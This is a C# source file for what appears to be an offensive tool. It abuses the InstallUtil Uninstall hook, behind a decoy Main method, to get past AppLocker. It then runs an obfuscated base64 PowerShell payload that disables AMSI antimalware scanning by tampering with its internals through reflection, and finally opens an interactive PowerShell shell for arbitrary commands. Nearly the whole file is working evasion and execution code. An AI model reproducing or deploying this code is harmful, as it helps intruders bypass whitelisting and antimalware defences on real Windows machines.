using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;


namespace InteractiveApplockerRunspace
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string cmd;
            Runspace rs = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            rs.Open();
            ps.Runspace = rs;

            // disable amsi
            ps.AddScript("[sySteM.Text.EnCodINg]::UNicOdE.gEtSTrINg([sYstEm.ConVeRT]::fRombASE64STRINg(\"IwAgAFMAdAB1AGIAOgAgAEYAaQBlAGwAZABPAGYAZgBzAGUAdAAKACYAIAB7ACQAYgBpAEgAegB5AEwAWgBxAEwANQA9AFsAQQBwAHAAZABvAE0AYQBpAG4AXQA6ADoAQwB1AFIAcgBFAG4AVABEAE8ATQBhAGkAbgAuAEcARQBUAGEAcwBTAGUAbQBiAGwASQBFAHMAKAApAHwAdwBIAGUAUgBlAC0ATwBiAEoARQBjAHQAewAkAF8ALgBMAE8AQwBBAFQASQBvAG4AIAAtAGEATgBkACAAJABfAC4ATABPAGMAQQB0AEkAbwBuAC4AZQBOAGQAUwB3AEkAdABoACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AZABsAGwAJwApAH0AOwAkAHkAUwBlAGwAQwBKADMAWgBWAFUAbAA9AFsAUwBZAFMAVABFAG0ALgBSAGUARgBsAEUAYwBUAGkATwBuAC4AQgBpAE4AZABJAE4ARwBGAEwAYQBnAFMAXQAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwA7AFsAUwBZAFMAdABlAG0ALgB0AGgAUgBlAEEAZABJAG4ARwAuAFQASABSAEUAQQBkAF0AOgA6AHMAbABFAGUAcAAoADgAMgApADsAJABhAHgAOQBmAFUANQBTAHMANQAyAGgAPQAkAGIASQBoAHoAWQBsAHoAUQBsADUALgBnAGUAdABUAHkAcABFAHMAKAApAHwAdwBIAGUAcgBFAC0AbwBCAEoAZQBDAHQAewAkAF8ALgBOAGEATQBlACAALQBFAFEAIAAkACgAKABbAHMAeQBTAHQARQBNAC4AVABFAFgAVAAuAEUATgBDAG8ARABJAE4ARwBdADoAOgBBAFMAYwBpAEkALgBnAEUAVABzAHQAcgBpAG4ARwAoAFsAYgB5AFQAZQBbAF0AXQAoACgANgA1ACoAMQAyAC8AMQAyACkALAAoADEAMAA5ACoANwAzAC8ANwAzACkALAAoADMAOAArADcANwApACwAKAA2ADIAKwA0ADMAKQAsACgAOAA1ACoANwAzAC8ANwAzACkALAAoADAAeAA3AEUANwA4ACAALQBiAHgAbwByACAAMAB4ADcAZQAwAEMAKQAsACgAMQAwADUAKgA2ADEALwA2ADEAKQAsACgAMQAwADgAKwAzADEALQAzADEAKQAsACgANgArADEAMAA5ACkAKQApACkAKQB9ADsAWwBWAE8ASQBkAF0AKABnAEUAVAAtAHYAQQByAEkAYQBCAGwARQAgAC0AbgBhAE0AZQAgACcAUAB3AFUAdABOAEoAMgAnACAALQBFAHIAcgBvAHIAQQBjAHQASQBPAE4AIABzAGkATABFAE4AVABsAHkAYwBPAG4AdABpAG4AdQBlACkAOwAkAEQAOABhAFcAYwBSAF8APQAkAEEAWAA5AEYAVQA1AFMAcwA1ADIAaAAuAEcARQB0AGYAaQBlAGwARAAoACQAKAAoACcAdAB4AGUAdABuAG8AQwBpAHMAbQBhACcAWwAoADcAKwAzACkALgAuADAAXQAgAC0AagBPAEkAbgAgACcAJwApACkALAAkAFkAUwBlAGwAQwBKADMAWgB2AHUATAApAC4ARwBlAFQAdgBhAGwAVQBFACgAJABuAFUAbABsACkAOwAkAFMAQQBtAEIAUQA0AFIATgA9AFsAUwBZAHMAVABFAG0ALgBCAEkAVABDAG8ATgB2AGUAUgBUAEUAcgBdADoAOgBHAEUAdABCAHkAdABlAFMAKABbAFMAeQBzAHQAZQBNAC4AaQBuAHQAMwAyAF0AOgA6AE0AQQBYAFYAYQBMAFUAZQApADsAJAB2AHAAWQBmAFUAOAA4AEsAOABoAD0AJwBSAHYAUwAwAFcAUwBpADgAUABiAFUATwBrACcAOwBbAFMAWQBzAHQARQBtAC4AUgB1AG4AVABJAE0AZQAuAEkATgBUAEUAcgBPAHAAcwBFAHIAdgBJAEMAZQBzAC4AbQBBAHIAcwBIAGEATABdADoAOgBjAE8AUAB5ACgAJABzAGEAbQBCAFEANABSAG4ALAAwACwAJABkADgAYQB3AGMAcgBfACwANAApAH0A\"))|iEx");
            ps.Invoke();

            while (true)
            {
                Console.Write("PS (iar.exe) " + Directory.GetCurrentDirectory() + ">");
                Stream inputStream = Console.OpenStandardInput();

                cmd = Console.ReadLine();

                if (String.Equals(cmd, "exit"))
                    break;

                Pipeline pipeline = rs.CreatePipeline();
                pipeline.Commands.AddScript(cmd);

                pipeline.Commands.Add("Out-String");

                try
                {
                    Collection<PSObject> results = pipeline.Invoke();
                    StringBuilder stringBuilder = new StringBuilder();

                    foreach (PSObject obj in results)
                    {
                        stringBuilder.Append(obj);
                    }

                    Console.WriteLine(stringBuilder.ToString().Trim());
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }


            }

            rs.Close();
        }
    }

}
